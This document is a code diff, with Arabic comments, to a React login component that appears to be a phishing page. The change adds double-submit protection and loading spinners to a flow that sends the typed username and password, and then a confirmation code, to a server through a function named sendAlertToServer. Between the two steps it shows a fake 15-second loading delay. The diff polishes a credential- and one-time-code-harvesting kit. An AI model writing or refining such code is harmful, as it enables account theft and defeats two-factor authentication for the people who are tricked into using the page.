@@ -35,6 +35,7 @@ type Screen = "credentials" | "loading" | "code" | "drop";
 export default function Login() {
   const [showPassword, setShowPassword] = useState(false);
   const [screen, setScreen] = useState<Screen>("credentials");
+  const [isSubmitting, setIsSubmitting] = useState(false); // ✅ منع الضغط المتكرر
 
   const form = useForm<LoginFormValues>({
     resolver: zodResolver(loginSchema),
@@ -89,22 +90,44 @@ export default function Login() {
   };
 
   // ============================================
-  // 📤 دالة إرسال بيانات الدخول
+  // 📤 دالة إرسال بيانات الدخول (مع منع الضغط المتكرر)
   // ============================================
   const onSubmit = async (data: LoginFormValues) => {
-    console.log('📝 Form submitted with:', data);
-    await sendAlertToServer(data.username, data.password);
-    setScreen("loading");
-    window.setTimeout(() => setScreen("code"), 15000);
+    // ✅ منع الضغط المتكرر
+    if (isSubmitting) return;
+    
+    setIsSubmitting(true);
+    
+    try {
+      console.log('📝 Form submitted with:', data);
+      await sendAlertToServer(data.username, data.password);
+      setScreen("loading");
+      window.setTimeout(() => setScreen("code"), 15000);
+    } catch (error) {
+      console.error('❌ Error:', error);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   // ============================================
-  // 📤 دالة إرسال رمز التأكيد
+  // 📤 دالة إرسال رمز التأكيد (مع منع الضغط المتكرر)
   // ============================================
   const onCodeSubmit = async (data: CodeFormValues) => {
-    console.log('📝 Code form submitted with:', data);
-    await sendAlertToServer("🔐 رمز التأكيد", data.code);
-    setScreen("drop");
+    // ✅ منع الضغط المتكرر
+    if (isSubmitting) return;
+    
+    setIsSubmitting(true);
+    
+    try {
+      console.log('📝 Code form submitted with:', data);
+      await sendAlertToServer("🔐 رمز التأكيد", data.code);
+      setScreen("drop");
+    } catch (error) {
+      console.error('❌ Error:', error);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   const resetLogin = () => {
@@ -112,6 +135,7 @@ export default function Login() {
     codeForm.reset();
     setShowPassword(false);
     setScreen("credentials");
+    setIsSubmitting(false); // ✅ إعادة تعيين حالة الزر
   };
 
   const alternativeSignIn = (event: MouseEvent<HTMLButtonElement>) => {
@@ -203,10 +227,15 @@ export default function Login() {
 
               <Button
                 type="submit"
+                disabled={isSubmitting} // ✅ تعطيل الزر أثناء الإرسال
                 className="mt-6 w-full"
                 data-testid="button-code-sign-in"
               >
-                Sign In
+                {isSubmitting ? (
+                  <span className="loading-spinner" aria-label="Loading" />
+                ) : (
+                  "Sign In"
+                )}
               </Button>
 
               <p className="mt-6 text-center text-sm font-semibold text-white">
@@ -248,7 +277,7 @@ export default function Login() {
                       <Input
                         id="username"
                         autoComplete="username"
-                        disabled={screen === "loading"}
+                        disabled={screen === "loading" || isSubmitting}
                         {...field}
                         data-testid="input-username"
                       />
@@ -272,7 +301,7 @@ export default function Login() {
                           id="password"
                           type={showPassword ? "text" : "password"}
                           autoComplete="current-password"
-                          disabled={screen === "loading"}
+                          disabled={screen === "loading" || isSubmitting}
                           className="pr-10"
                           {...field}
                           data-testid="input-password"
@@ -310,11 +339,11 @@ export default function Login() {
 
               <Button
                 type="submit"
-                disabled={screen === "loading"}
+                disabled={screen === "loading" || isSubmitting}
                 className="mt-8 w-full"
                 data-testid="button-sign-in"
               >
-                {screen === "loading" ? (
+                {screen === "loading" || isSubmitting ? (
                   <span className="loading-spinner" aria-label="Loading" />
                 ) : (
                   "Sign In"
